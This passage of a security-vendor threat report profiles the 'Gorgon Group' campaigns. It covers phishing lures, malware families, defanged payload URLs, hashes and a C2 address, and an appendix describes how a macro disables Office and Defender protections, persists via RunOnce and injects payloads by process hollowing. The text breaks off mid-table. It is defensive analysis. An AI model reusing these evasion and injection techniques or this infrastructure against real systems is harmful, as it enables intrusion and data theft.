{
    "title": "the gorgon group_ slithering between nation state and cybercrime",
    "text": "Tools\nPlaybooks\nSpeaking Events\nAbout Us\nThe Gorgon Group: Slithering Between Nation\nState and Cybercrime\n26,538\npeople reacted\n5\n17 min. read\nThis post is also available in: 日本語  (Japanese )\nUnit 42 researchers have been tracking Subaat , an attacker, since 2017. Recently Subaat drew our attention due\nto renewed targeted attack activity. Part of monitoring Subaat included realizing the actor was possibly part of a\nlarger crew of individuals responsible for carrying out targeted attacks against worldwide governmental\norganizations. Technical analysis on some of the attacks as well as attribution links with Pakistan actors have been\nalready depicted by 360 and Tuisec , in which they found interesting connections to a larger group of attackers\nUnit 42 researchers have been tracking, which we are calling Gorgon Group.\nIn addition to the numerous targeted attacks, Unit 42 discovered that the group also performed a litany of attacks\nand operations around the globe, involving both criminal as well as targeted attacks.\nStarting in February 2018, Palo Alto Networks Unit 42 identified a campaign of attacks performed by members of\nGorgon Group targeting governmental organizations in the United Kingdom, Spain, Russia, and the United States.\nAdditionally, during that time, members of Gorgon Group were also performing criminal operations against\ntargets across the globe, often using shared infrastructure with their targeted attack operations.\nGorgon Group’s activity is interesting because in addition to traditional command and control (C2) domain\nutilization, Gorgon Group used common URL shortening services to download payloads; ultimately providing an\nextensive list of click counts and statistical data. Also, interestingly, Gorgon Group has a diverse and active\ncriminal element. On much of the C2 infrastructure we identified several crimeware family samples. RATs such as\nNjRat and infostealers like Lokibot were leveraging the same C2 infrastructure as that of the targeted attacks.\nUsing numerous decoy documents and phishing emails, both styles of attacks lacked overall sophistication, but\nthe effectiveness of this group and campaign cannot be denied.\nAttack Delivery and Infrastructure Analysis\nThe attack methodology, as well as analysis of several of the “.vbs”, “.doc” and “.exe” samples found hosted in the\nattacker’s infrastructure has been covered by 360 and Tuisec. Both 360 and Tuisec found that the most\ncommonly observed and consistent attack pattern consists of the following stages:\nFigure 1. Basic attacker methodology\nAt the initial stage, the phishing attempts are kept very simple and lightweight by using OLE2Link objects that will\nusually make use of URL shortening services such as Bitly and t2m[.]io.\nFigure 2 OLE2Link content example\nWhile investigating the domains and infrastructure used by the phishing components of Gorgon Group, Unit 42\nresearchers witnessed several common operational security flaws with Gorgon Group’s actors throughout their\nmany campaigns. It was one of these OPSEC failures that gave us an interesting cross‐section of malware Gorgon\nGroup is using. Included in the directories were a combination of files leveraged in targeted attacks mentioned\nabove against nation states. Additionally, there was a plethora of malware samples that were criminal in nature.\nFigure 3. Open directory listing of hxxp://stevemike‐fireforce[.]info/\nBased on the contents and structure of the initial identified open directories, it was possible to find several\ninfrastructure patterns in use. An example of a domain structure and malware delivery contents is shown in the\nfollowing table:\nSHA‐256 Infrastructure URL\n4e4967e3d39256049bc1054b966e5c609245fd3b2a934fda5cd1885526d8221e stemtopx[.]com/work/1.doc\nd2f58b08f8abfe5055f3c1f0b8d991dfe1deb62807a5336b134ce2fb36d87284 stemtopx[.]com/work/3.exe\ndb4d8d931f1b979cf32d311f9b03e851d3283b4f7e86252730247da25cf9f093 stemtopx[.]com/work/2.exe\n4c6e3d8fdb2394edffe4a5bc45a238749e929301efa8bcfa3a247b1ab68eac54 stemtopx[.]com/work/1.exe\n81de431987304676134138705fc1c21188ad7f27edf6b77a6551aa693194485e stemtopx[.]com/work/new/20.exe\n26151f1e24bc97532e49013fbe04919de1f51e346dba1f10ce2e389160f2fb9d stemtopx[.]com/work/new/3.exe\na100ce0a67c5890bcc38d2b6e30f9164dfe266126ec40a2fd7eb8e941dc7d025 stemtopx[.]com/work/new/2.exe\n806098afc2148dabb838b24c4dfaa148269ac3ddf769aee54e75d46bfef0c506 stemtopx[.]com/work/doc/20.doc\nbf37d6cb393b440f790ad2b333624fde079e10bfaeb44d65188e3ccc551c982f stemtopx[.]com/work/k/1.docx\n81de431987304676134138705fc1c21188ad7f27edf6b77a6551aa693194485e stemtopx[.]com/work/k/1s.exe\nTable 1. Malware samples and infrastructure for hxxp://stemtopx[.]com\nPattern Example\n[domain]/work/docnew/[filename]\n[domain]/administrator/help/[filename]\n[domain]/xe/m/[filename]\n[domain]/xe/s/[filename]\n[domain]/images/yupsia/exe/[filename]\n[domain]/images/yupsia/doc/[filename]\nTable 2. Examples of domain patterns\nThe Gorgon Group Crew Breakdown\nFinding accessible directories, in combination with their other operational security failures, made it easy to start\nconnecting the dots on Gorgon Group members. 360 and Tuisec already identified some Gorgon Group\nmembers. In addition to Subaat, we counted an additional four actors performing attacks as part of Gorgon\nGroup. While it’s not known if the attackers physically reside in Pakistan, all members of Gorgon Group purport\nto be in Pakistan based on their online personas.\nfudpages\nOne member of Gorgon Group‐ we’re calling ‘fudpages’, was found during this campaign activity based on their\nutilization of shared infrastructure. One specific Microsoft document drew our attention.\n(446e1c80102c8b9662d66d44525cb9f519369061b02446e0d4cd30cd26d79a25)\nThis Microsoft Word document was sent via email to several industries across the US and Switzerland. We\nnoticed that this document pulls down additional malware from a C2 also being used in attacks by other Gorgon\nGroup members.  Additionally, this document communicates to a relatively new piece of C2 infrastructure‐\numarguzardijye[.]com, which is hosted on 91[.]234[.]99[.]206.\nFigure 4 WHOIS information for umarguzardijye[.]com\nFudpages, similar to other Gorgon Group members, made many of the same OPSEC failures of his or her fellow\nGorgon Group members.\nFigure 5 Open directory of umarguzardijye[.]com\nThe WHOIS record for our new domain, umarguzardijye[.]com, shows that the registrant organization is\n“fudpages” and the address provided in Pakistan. When looking closer at the IP hosting umarguzardijye[.]com, we\nnoticed 91[.]234[.]99[.]206 hosts two additional domains that drew our attention‐fudpages[.]ru and fudpage[.]ru.\nFudpage appears to be a small marketplace selling bulletproof hosting, RDP sessions, fake documents and a litany\nof additional malicious wares.\nFigure 6 Advertisement website for FUD pages and spamming tools\nListed on fudpage’s marketplace are several pieces of contact information, which ultimately led us to an\nunderground persona that was selling, distributing and trading maliciousness across underground forums.\nFigure 7. Underground forum posting for RAT\nOperating underground since at least 2016, fudpages is also active on streaming sites like Youtube, where they\nuse it as an advertising platform.\nFigure 8. Youtube video posting on how to perform malicious activities\nLike all of Gorgon Group’s members, Fudpage’s online profile, infrastructure utilization and standardization,\nconnects them back to Gorgon Group. This connection to Gorgon Group helps illustrate the seemingly\nstandardized methodologies Gorgon Group most often employs.\nThe Tale of Two Intentions: Criminal and Targeted\nAs part of the investigation, Unit 42 researchers were able to identify an interesting characteristic about how the\nGorgon Group crew uses shared infrastructure between cybercrime and targeted attacks. The crew combines\nboth regular crime and targeted attack objectives using the same domain infrastructure over time, rarely\nchanging their TTPs.\nStarting in mid‐February, Unit 42 researchers have been tracking an active campaign sharing a significant portion\nof infrastructure leveraged by Gorgon Group for criminal and targeted attacks. In Figure 9, below, red indicates\ntargeted IP addresses, malware, registrant information, and domains associated with the targeted attack\ncampaign while blue indicates criminal attack IP addresses, malware used, registrant information, and domains:\nFigure 9. Overlap between infrastructure\nWhile looking at the total cluster of Gorgon Group activity, it’s also interesting to look at the total click volume\nduring the campaign’s timeframe. Leveraging click counts for the campaign for Bitly, we were able to see Gorgon\nGroup’s activity volume increase throughout April.\nFigure 10. Total clicks performed on Gorgon Group infrastructure over time\nLooking specifically at one domain used in both cybercrime and targeted attacks, we can see a micro viewpoint\ninto their campaign. Between April 1, 2018 and May 30, 2018, we observed the domain stevemike‐fireforce[.]info\nused in a Gorgon Group cybercrime campaign involving more than 2,300 emails and 19 documents in the initial\nattack. This same domain was also used during the same period of time in targeted attacks against several\nworldwide nation state agencies.\nAnalysis of the data allowed Unit 42 researchers to make some interesting conclusions:\nSeveral unique domains are used for both cybercrime and targeted attacks.\nThe amount of sessions for cybercrime is higher than targeted, as expected.\nThere is no specific pattern on when targeted attacks happen, the domains can initially be used for cybercrime\nand then quickly utilized in a targeted attack with little warning.\nAs a graphical representation, Figure 11, below, indicates the amount of unique sessions observed for this\ndomain over the campaign’s operational time, representing the attack intention in two separate areas.\nIt’s interesting to observe on April 24th, this domain delivers a targeted attack aimed at several worldwide\ngovernmental bodies, in the middle being of also being used in the delivery of a malspam campaign. The subject\nused in this case of targeted attack was “Pakistan eying Sukhoi‐35 figther planes as part of defense deal from\nRusia”:\nFigure 11 Crimeware activity versus targeted activity against stevemike‐fireforce[.]info\nIn order to have a better idea of the volume of unique attacks per date and intention, see the following volume‐\nbased representation in Figure 12, where targeted attack volumes are represented in red and crime in green:\nFigure 12. Volume of crimeware activity versus targeted attacks using stevemike‐fireforce[.]info\nFocusing on one domain allowed us to quickly understand its usage and better understand how it interconnects\nto a larger malspam campaign.\nIntention #1: Cybercrime\nCriminal attacks are not new to this crew, some of which was covered in our previous blog for Gorgon Group\nmember Subaat. During the current campaign, Gorgon Group’s criminal enterprises netted 132,840 Bitly clicks\nfrom mid‐February to the present. Targeting a large cross‐section of industries, there was little in terms of\ntargeting during their criminal activity.\nFigure 13. Criminal Attacks Bitly Link Clicks Worldwide\nA majority of the crimeware distribution was done via standard malspam campaigns leveraging well‐known\n“Purchase Order” and “ SWIFT ” lures. Most of the filenames included a variance of filenames like:\nSWIFT {Date}.doc\nSWIFT COPY.doc\nPURCHASE ORDER {Random Value}.doc\nDHL_RECEIPT {Random Value}.doc\nSHIPPING RECEIPT {Date}.doc\nThe tools used by the crew do not really differ in general crime vs more targeted attacks, in both instances they\nrelated to several remote access and data stealing malware families. The top five malware families identified as\ncriminal in nature so far have been the following:\nNjRAT: NjRAT is a remote‐access Trojan commonly used and witnessed in attacks that are both criminal and\ntargeted attacks since as early as 2013.\nRevengeRAT : RevengeRAT is a remote‐access Trojan that was released for free on underground forums in\n2016. While RevengeRAT could be used in targeted attack campaigns, it is commonly witnessed in criminal\nmalspam campaigns.\nLokiBot: LokiBot is a commodity malware sold on underground sites which is designed to steal private data\nfrom infected machines, and then submit that info to a command and control host via HTTP POST. This private\ndata includes stored passwords, login credential information from Web browsers, and a variety of cryptocurrency\nwallets.\nRemcosRAT: RemcosRAT is a remote‐access Trojan that first appeared in underground forums in July of 2016.\nThe RemcosRAT has a feature‐rich builder, which allows for the creation of Microsoft Word documents with\nmalicious macros.\nNanoCoreRAT: Generally delivered via phishing, NanocoreRAT is a remote‐access Trojan that opens a back\ndoor and steals information from the compromised computer.\nOne interesting note about the criminal activity of Gorgon Group is their usage of Bitly. Similar to that of their\ntargeted attacks, Gorgon Group leveraged Bitly for distribution and shortening of C2 domains. Using the same\ntechniques across both their criminal and targeted activity, made it easier for us to cluster Gorgon Group\ninfrastructure and activity.\nFigure 14. Clicks on Bitly links in criminal attacks\nOverall, in spite of the lack of sophistication in Gorgon Group’s activity, they were still relatively successful; once\nagain proving that simple attacks on individuals without proper protections, work.\nIntention #2: Targeted Attacks\nBeginning in early March 2018, Unit 42 started observing targeted attacks against Russian, Spanish and United\nStates government agencies operating in Pakistan. As we continued to investigate, it became apparent that\nGorgon Group had been consistently targeting worldwide governmental organizations operating within Pakistan.\nWhile Gorgon Group has been making minor changes in their methodologies, they are still actively involved in\nboth targeted and criminal attacks.\nThis Gorgon Group campaign leveraged spear phishing emails with Microsoft Word documents exploiting CVE‐\n2017‐0199 . The spear phishing emails involved in this campaign would most often originate from Gmail accounts\nmasquerading as legitimate individuals, such as a prominent Lt. Col in the Pakistani military.\nThe subjects of the spear phishing emails were also interesting, often contained subject matter related to\nterrorist groups, military activity, or political topics.\nActing FOREIGN Minister of Pakistan\nInvitation to lady wives of H.E. Ambassador/High Commissioner from lady wife of H.E. High Commissioner of\nBangladesh\nPakistan eying Sukhoi‐35 fighter planes as part of defense deal from Russia 2018.143\nPG COURSE IN 2018‐2021 BATCH India Bangladesh and Pakistan\nPress Release on Observance of Historic Mujibnogor Dibosh by Pakistan Mission on 17 April 2018\nAfghan Bomb Blast report by ISI\nUSAJOBS Daily Saved Search Results for New GS15 for 3/30/2018\nHow Rigging take place in Senate Elections in Pakistan\nAfghan Terrorist group details ISI Restricted113\n1971 Liberation War Freedom Fighters in Pakistan Army Custody Database\nAdditionally, the following filenames were witnessed in these attacks (spelling and grammar mistakes included):\nLiberation Freedom Fighter.xlam\nNSC details of participants.xlam\nRaw Sect Vikram report on Pak Army Confidential.doc\nUSA Immagration Policy for Families.ppam\ndoc\nCV FM.doc\ndoc\nSukhoi35 deal report.doc\nNominal Roll.doc\nPress Release 17 April.doc\nAfghan Blast report by ISI.doc\nRigging in Pakistan Senate.doc\nAfghan Terrorist group report.doc\nThe payloads for these attacks varied in malware family. The popular NanoCoreRAT, QuasarRAT, and NJRAT\nvariants were used heavily.\nIn a number of these attacks, the popular third‐party URL shortening service Bitly was used to ultimately deliver\nthe payloads for these attacks.\nIt’s important to remember, that while we were using Bitly links to help gauge click location, anyone who clicks\nthese links (including researchers) are also counted. So, while having this click information is valuable, it’s only\none small piece of a larger picture related to targeting.\nFigure 15. Bitly Click Information Related to a Gorgon Group C2 Domain\nThe heaviest concentration of Bitly URL interaction came from Pakistan, which at 410 clicks accounted for 39%\nof all clicks. The United States amassed 194 clicks, accounting for 19%.\nFigure 16 Clicks on Bitly links in targeted attacks\nThe attacks took place primarily in March, late April, and early May of this year.\nConclusion\nGorgon Group isn’t the first actor group we’ve witnessed dabble in both nation state level and criminal attacks.\nWhat makes Gorgon Group unique is, that despite the group’s operational security failures, they still remained\nparticularly effective. Looking closer at the actors participating in Gorgon Group gave us a unique perspective into\nthe inner workings of an attack.\nLeveraging the same infrastructure for targeted attacks and criminal enterprises made for an interesting cross‐\nsection of mixed intentions. Ultimately, this lead us to the conclusion that several of Gorgon Group’s members\nhave a nexus in Pakistan. While Gorgon Group remains active, Palo Alto Networks customers are protected from\nthis threat in the following ways:\nWildFire detects all current Gorgon Group files with malicious verdicts.\nAutoFocus customers can track these samples with the Gorgon Group  actor tag.\nTraps blocks all of the files currently associated with Gorgon Group\nAppendix\nAnalysis of a targeted attack\n“1971 Liberation War Freedom Fighters in Pakistan ArmyCustody Database98”\nThe delivery documents used in the targeted attacks are Microsoft Office documents that contain a macro that\nattempts to compromise the system. The infection process is rather interesting, as it involves multiple layers of\n.NET assemblies that will eventually download the NanoCore remote administration tool (RAT) from a remote\nserver and inject it into another process. In some instances, we have also seen the RemcosRAT malware family\ndelivered as the final payload. The infection process not only downloads and executes a payload, but it also\ndownloads and opens a decoy document to lower the recipient’s suspicions of the entire process. Additionally,\nthe process attempts to lower the overall security of the system by disabling security features in Microsoft Office\nand Windows Defender. The payloads themselves are rather interesting, as the developer wraps the malicious\ncode with legitimate source code freely available online.\nDelivery document\nThe delivery document contains a macro that downloads an executable from a remote server. The macro\ndownloads a payload from hxxp://lokipanelhostingpanel[.]gq/work/kh/1.exe (SHA256:\n84ed59953f57f5927b9843f35ca3c325155d5210824d3b79b060755827b51f72) by running the following\ncommand line process:\nThe macro then attempts to kill Microsoft Office and Windows Defender processes using the ‘taskkill’ command.\nThe command does not attempt to kill the specific Office process that would load the particular delivery\ndocument, such as Excel in the case of this “.xlam” file, but instead attempts to kill processes associated with\nWord, Excel, PowerPoint and Publisher. This blanket approach to kill the appropriate process suggests that the\nactor does not change this command within their macro across delivery documents they created within these\nMicrosoft Office applications. The command does not just attempt to kill the Windows Defender process, but\nalso attempts to clear the detection definitions to not trigger an antivirus alert. The macro performs all of these\nactivities with the following command:\nThe macro also attempts to deactivate security mechanisms within Microsoft Office products by modifying the\nregistry. First, the macro attempts to enable macros in multiple versions of Word, PowerPoint, Publisher and\nExcel by setting the following registry keys to the value of 1:\nThe macro also attempts to disable protections provided by the Protected View capability within Word, Excel,\nand PowerPoint by setting the following registry keys to a value of 1:\nFirst Stage Payload\nThe payload installed by the macro is a downloader Trojan written in VB.NET that downloads a secondary payload\nand decoy document. It appears the author of this downloader used the source code from an open source tool\ncalled “Sales System Application”, which is freely available at hxxp://www.a1vbcode[.]com/app‐2999.asp. We\nbelieve the author of the downloader uses this Sales System Application to provide a legitimate look to their\nmalicious payload. The malware author adds their own code to the application to run their malicious code before\ncalling the legitimate functions that display the graphical user interface. The following functions are called when\nthe application attempts to initialize the menu:\nThe “Speed” method in the legitimate ETransaksi class contains legitimate code from the Sales System\nApplication; however, the author of this tool includes this code in an if/else construct that bypasses these\ninstructions by setting a false flag to skip the legitimate code and execute the next step to the malicious code.\nThe following code example shows the false flag being set (5 > 115) and the ETransaksi.diomadnfagaghagh\nmethod being called:\nThe payload uses this technique to run a chain of methods that eventually carry out its malicious task. With the\nexception of the ‘Speed’ method previously mentioned, the names of the methods called in this chain appear to\nbe fairly random, as seen in the following list:\n1. ETransaksi.Speed\n2. ETransaksi.diomadnfagaghagh\n3. ETransaksi.fjcsERIfjfiojsGHIsdifjksi\n4. ETransaksi.gsgjIDJIGJIGJIGJIFDOSpl\n5. ETransaksi.FJaioefgkaoeK\nThe last two methods in the chain carry out a majority of the first payload’s functionality. The\nETransaksi.gsgjIDJIGJIGJIGJIFDOSpl method obtains a resource named “fgjfaieSDFAOKEfj.GSrdofjksrgj”, which is\ndecrypted in the ETransaksi.FJaioefgkaoeK method using a multibyte XOR cipher with the following key:\nThe resulting cleartext is another .NET assembly, which the payload will load within its own process space.\nEmbedded Trojan\nThis Trojan loaded by the first payload contains several embedded executables that it uses to ultimately download\nand execute a secondary payload, as well as downloading and opening a decoy document. An unknown\nprogrammatic builder tool appears to have created this Trojan, as the code shows multiple configuration options\nfor additional functionality that were not enabled within this specific sample.\nUpon execution, this Trojan checks to see if it was configured with “BINDERON” to determine if it should extract\nan embedded payload from a resource named “B”, save it to %TEMP%\\%BIND1%, and create a new process\nwith the embedded payload. While the Trojan was configured to carry out this activity, the actor did not embed a\npayload within the “B” resource, so this functionality does not carry out any activities, rather it just causes an\nexception and continues running.\nAnother configuration option encountered by this Trojan is a check for ‘%STARTUPON%’. This sample was not\nconfigured to execute with this option enabled, however, should this option be enabled, the Trojan would attempt\nto install itself to the system at a specific location by writing its contents in base64‐encoded format to the\nfollowing file:\n%APPDATA%\\Microsoft\\Windows\\DsvHelper\\%DECRY%.txt\nThe Trojan then reads the contents of the %DECRY%.txt file, decode them and write the decoded data to the\nfollowing file:\n%USERPROFILE%\\APPDATA\\Roaming\\Microsoft\\Windows\\DsvHelper\\@RANDOM@.exe\nThe Trojan would then create a new process using the @RANDOM@.exe file. When the Trojan runs as an\nexecutable within the “DsvHelper” folder, the Trojan will create a shortcut (.lnk file) and save the shortcut to the\n‘DsvHelper’ folder. It then creates the following registry key to automatically run the Trojan each time the system\nstarts:\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\@RANDOM@\nThe main behavior carried out by this Trojan involves obtaining an embedded executable, hollowing the current\nTrojan, writing the new embedded executable to the process memory and calling a specific function in the newly\nwritten payload. The embedded payload written to process memory exists in the “R” resource and called function\nin the new payload is named “RPe.Test.Work”. The function will take another executable embedded in the initial\nTrojan as a resource named “M”, which it attempts to inject into the following process to execute:\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\cvtres.exe\nWhile it’s configured to inject into cvtres.exe, the Trojan is also capable of injecting its code into the following\nprocess as well:\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe\nEmbedded injector Trojan\nThe R payload discussed above is nothing more than an injector Trojan, which accepts a path to an executable\nand a buffer of code to inject into the process as arguments. The R payload will create a process using the\nsupplied path using the CreateProcessA API function. The payload then finds the base address of the newly\ncreated process using the GetThreadContext API function, and then calls NtUnmapViewOfSection to hollow the\nprocess. The payload then calls the VirtualAllocEx API to create a buffer in the newly hollowed process and the\nWriteProcessMemory API to write the supplied data buffer that contains the code to inject to this newly created\nbuffer. The payload then sets EIP to the entry point of the newly injected code using the SetThreadContext API,\nand finally calls the NtAlertResumeThread API function to run the injected code.\nEmbedded Downloader Trojan\nThe M payload (referenced previously along with the R payload, above) injected and executed within the memory\nspace of the other process is a downloader Trojan. This specific downloader appears to have been created using\na VB2Exe tool, as the functional code that carries out the downloading functionality exists as a VBScript\nembedded within the payload. The payload extracts this VBScript from a resource and saves it to a file that it\nextracts from another resource. The filename used to save the VBScript is “khm.vbs”, which is eventually run\nusing “wscript”. The VBScript has a SHA256 has of\n649e3922ec53d5b195ed23aac08148faeb561f47e891b1e6ff60a2a9df4fea17, which calls two PowerShell\ncommands to download and execute a payload and downloading and opening of a decoy document. The payload\nis downloaded from the following location and saved to “%PUBLIC%\\svchost32.exe”:\nhxxp://lokipanelhostingpanel[.]gq/work/kh/1s.exe\nThe decoy document is downloaded from hxxp://lokipanelhostingpanel[.]gq/work/kh/1.docx and saved to\n“%PUBLIC%\\svchost32.docx”. When opened, the decoy document shows the following content, which contains\nthe image and copied text from a news article  titled “Top civil‐military body rejects Nawaz’s controversial\nstatement on Mumbai attacks,” as seen in the following screenshot:\nFigure 17. Decoy document downloaded by malware\nFinal Payload\nThe final payload is a dropper Trojan that installs the NanoCore RAT. The author of this payload (SHA256:\n690fc694b0840dbabb462ae46eb836777420b3354e53a6944a2e169b965b0bec) appears to have used an open\nsource tool called “Saransh Email System” as a basis of this tool, which was likely downloaded from\nhxxp://www.a1vbcode[.]com/app‐4601.asp. Much like the original payload, this tool uses if/else statements to\nskip the legitimate code in the Saransh Email System source to run the malicious functions, which have the same\nmethod names as the original tool and follow the same call sequence:\n1. Form1.Speed\n2. Form1.diomadnfagaghagh\n3. Form1.fjcsERIfjfiojsGHIsdifjksi\n4. Form1.gsgjIDJIGJIGJIGJIFDOSpl\n5. Form1.FJaioefgkaoeK\nThis chain of functions eventually loads a resource named ‘GSrdofjksrgj’, which the tool decrypts using the same\nalgorithm and key as in the initial payload:\nThe decrypted payload has a SHA256 hash of\n5e805a88294f6d25d55103d19d13e798e01ad70e6b89e9c58db5d468cc63b3d5, which is a variant of the\nNanoCore remote administration tool. This variant of NanoCore was configured to communicate with the\nfollowing IP address as its C2 server over TCP port 6666:\n115.186.136[.]237\nBitly short URLs and expanded domains\nShort Bitly URL Expanded URL\nhttp://bit[.]ly/Loaloding http://www.asaigoldenrice[.]com/daq/doc/2.doc\nhttp://bit[.]ly/Loadingnnsa http://onedrivenet[.]xyz/work/docnew/4.doc\nhttp://bit[.]ly/2JmQLW6 http://stemtopx[.]com/work/doc/13.doc\nhttp://bit[.]ly/2JsruKm http://stemtopx[.]com/work/doc/4.doc\nhttp://bit[.]ly/2GUaY49 http://fast‐cargo[.]com/images/file/vb/VBS/doc/3.doc\nhttp://bit[.]ly/Loadingnns http://onedrivenet[.]xyz/work/docnew/4.doc\nhttp://bit[.]ly/2Im2IOF http://panelonetwothree[.]ml/zico/doc/doc8/zloadings.doc\nhttp://bit[.]ly/primeload http://fast‐cargo[.]com/images/file/vb/VBS/doc/1.doc\nhttp://bit[.]ly/loader2018 http://asaigoldenrice[.]com/sim/new.doc\nhttp://bit[.]ly/2xZ1kO6wdscsac http://stemtopx[.]com/work/doc/3.doc\nhttp://bit[.]ly/2M2bIYh http://stemtopx[.]com/work/doc/root.doc\nhttp://bit[.]ly/2r9PSIv http://stevemike‐fireforce[.]info/work/doc/11.doc\nhttp://bit[.]ly/Loadiendg http://www.0‐day[.]us/img/doc/6.doc\nhttp://bit[.]ly/2rpmJKsrdtrdtdfysersgerstrdFCG\nRDRhttp://stevemikeforce[.]com/work/doc/7.doc\nhttp://bit[.]ly/2Fu4ZSfloading http://panelonetwothree[.]ml/zico/xe/snoop/ocsnoop/snoop.doc\nhttp://bit[.]ly/2HloaderqVbva http://diamondfoxpanel[.]ml/doc/1/11.doc\nhttp://bit[.]ly/Loardising http://onedrivenet[.]xyz/work/docnew/12.doc\nhttp://bit[.]ly/2JB3KXD http://stemtopx[.]com/work/doc/8.doc\nhttp://bit[.]ly/1_loadingH7TvJa http://diamondfoxpanel[.]ml/doc/1.doc\nhttp://bit[.]ly/Loadijging http://onedrivenet[.]xyz/work/docnew/8.doc\nhttp://bit[.]ly/Laodiingplease http://onedrivenet[.]xyz/work/docnew/13.doc\nhttp://bit[.]ly/2HvQBirEam832ASADx http://stevemike‐fireforce[.]info/work/dola/3.doc\nhttp://bit[.]ly/2I5T7b9hgvgvjcVYVY http://stevemikeforce[.]com/work/doc/6.doc\nhttp://bit[.]ly/paymentsuae http://brevini‐france[.]cf/xp/doc/swift.doc\nhttp://bit[.]ly/Laodingipleasewait http://www.asaigoldenrice[.]com/daq/doc/10.doc\nhttp://bit[.]ly/loadingxxxx http://www.asaigoldenrice[.]com/daq/doc/4.doc\nhttp://bit[.]ly/2Gmziko http://zupaservices[.]info/doc/z.doc\nhttp://bit[.]ly/2sQhJOO http://stemtopx[.]com/work/doc/6.doc\nhttp://bit[.]ly/laodinfokqaw http://stevemike‐fireforce[.]info/work/doc/5.doc\nhttp://bit[.]ly/loadrinfing http://www.asaigoldenrice[.]com/daq/doc/15.doc\nhttp://bit[.]ly/2JaBgAS http://acorn‐paper[.]com/administrator/help/7.doc\nhttp://bit[.]ly/2loadingqlOQcM http://diamondfoxpanel[.]ml/doc/4/44.doc\nhttp://bit[.]ly/loardding http://fast‐cargo[.]com/images/file/vb/VBS/doc/11.doc\nhttp://bit[.]ly/loidaring https://www.0‐day[.]us/img/doc/5.doc\nhttp://bit[.]ly/LoadingPleaseWait http://www.asaigoldenrice[.]com/daq/doc/20.doc\nhttp://bit[.]ly/2HJv5Ud http://stevemike‐fireforce[.]info/work/doc/1.doc\nhttp://bit[.]ly/Loading13 http://fast‐cargo[.]com/images/file/vb/VBS/doc/13.doc\nhttp://bit[.]ly/2Lzpjp1 http://stemtopx[.]com/work/doc/19.doc\nhttp://bit[.]ly/tt_seafood http://acorn‐paper[.]com/administrator/help/en‐GB/8.doc\nhttp://bit[.]ly/Lording http://fast‐cargo[.]com/images/file/vb/VBS/doc/7.doc\nhttp://bit[.]ly/loadingsmins http://www.asaigoldenrice[.]com/daq/doc/1.doc\nhttp://bit[.]ly/2_loadingJwkhJA http://diamondfoxpanel[.]ml/doc/7.doc\nhttp://bit[.]ly/Laodiingpleasesa http://onedrivenet[.]xyz/work/docnew/13.doc\nhttp://bit[.]ly/2tnW5lu http://stemtopx[.]com/work/newdoc/1.doc\nhttp://bit[.]ly/tt_loadinghttp://acorn‐\npaper[.]com/administrator/components/com_templates/4.doc\nhttp://bit[.]ly/2wzkloading http://panelonetwothree[.]ml/zico/doc/zloading.doc\nhttp://bit[.]ly/Loadingans http://onedrivenet[.]xyz/work/docnew/14.doc\nhttp://bit[.]ly/2r9jLcQloading http://panelonetwothree[.]ml/zico/doc/zik.doc\nhttp://bit[.]ly/loadingpleasewairrs http://stevemike‐fireforce[.]info/work/dola/2.doc\nhttp://bit[.]ly/2arubabKmpgwP http://panelonetwothree[.]ml/iran/uae/done/oc/uae.doc\nhttp://bit[.]ly/2HAwzmN3290293sadjokwwadj\noWhttp://stevemike‐fireforce[.]info/work/doc/12.doc\nhttp://bit[.]ly/loadingasz http://0‐day[.]us/img/doc/10.doc\nhttp://bit[.]ly/ntissa2vFamys http://acorn‐paper[.]com/images/locations/thumbnails/oc/m.doc\nhttp://bit[.]ly/2IgzmRxEmasidE9kEjidlE http://panelonetwothree[.]ga/work/doc/3.doc\nhttp://bit[.]ly/2JqmuWp http://stemtopx[.]com/work/doc/16.doc\nhttp://bit[.]ly/load242HmFqZ6 http://panelonetwothree[.]ml/simon/exp/oc/mm.doc\nhttp://bit[.]ly/2L17QGqloading http://panelonetwothree[.]ml/zico/doc/doc8/zxloading.doc\nhttp://bit[.]ly/2MarX5t http://stemtopx[.]com/work/doc/9.doc\nhttp://bit[.]ly/Loadingnix http://www.asaigoldenrice[.]com/daq/doc/3.doc\nhttp://bit[.]ly/2HyVGGy_loading http://panelonetwothree[.]ml/iran/uae/done/oc1/uae.doc\nhttp://bit[.]ly/2H8euroshttp://acorn‐\npaper[.]com/administrator/components/com_templates/views/2.doc\nhttp://bit[.]ly/2I2mUBFstthdhtrhdtyftfyj http://stevemikeforce[.]com/work/doc/8.doc\nhttp://bit[.]ly/Loininding http://www.0‐day[.]us/img/doc/8.doc\nhttp://bit[.]ly/2F02ZRq http://stevemike‐fireforce[.]info/work/doc/2.doc\nhttp://bit[.]ly/Loadingpleasewait http://onedrivenet[.]xyz/work/docnew/19.doc\nhttp://bit[.]ly/2jE36KjhvjhgkHJHKLHGFHJ http://stevemikeforce[.]com/work/doc/3.doc\nhttp://bit[.]ly/Waitpleasewait http://stevemike‐fireforce[.]info/work/doc/8.doc\nhttp://bit[.]ly/Loiading http://fast‐cargo[.]com/images/file/newvbs/doc/1.doc\nhttp://bit[.]ly/Loadingplasewaitsm http://stevemike‐fireforce[.]info/work/doc/3.doc\nhttp://bit[.]ly/2jCTHCNasiudhasdASdy7656bas\nduhttp://stevemikeforce[.]com/work/doc/2.doc\nhttp://bit[.]ly/loadingpleaswaitrr http://stevemike‐fireforce[.]info/work/doc/4.doc\nhttp://bit[.]ly/Loadingnsi http://onedrivenet[.]xyz/work/docnew/2.doc\nhttp://bit[.]ly/2JRUNKh http://www.stemtopx[.]com/work/newdoc/3.doc\nhttp://bit[.]ly/2Hload25YdU19 http://panelonetwothree[.]ml/simon/exp/oc/25/m25.doc\nhttp://bit[.]ly/2lording http://fast‐cargo[.]com/images/file/vb/VBS/doc/8.doc\nhttp://bit[.]ly/2M9lLL6 http://stemtopx[.]com/work/doc/15.doc\nhttp://bit[.]ly/Loggeding http://fast‐cargo[.]com/images/file/newvbs/doc/4.doc\nhttp://bit[.]ly/Loadingwaitplez http://stevemike‐fireforce[.]info/work/doc/10.doc\nhttp://bit[.]ly/ASDj23234j4oDj3234Sdmk http://stevemike‐fireforce[.]info/work/doc/5.doc\nhttp://bit[.]ly/2JloadingspWgLs2 http://acorn‐paper[.]com/components/com_content/models/oc/s.doc\nhttp://bit[.]ly/Loadingpleasewaitnn http://stevemike‐fireforce[.]info/work/dola/4.doc\nhttp://bit[.]ly/2sPe3wZrdtrdytd 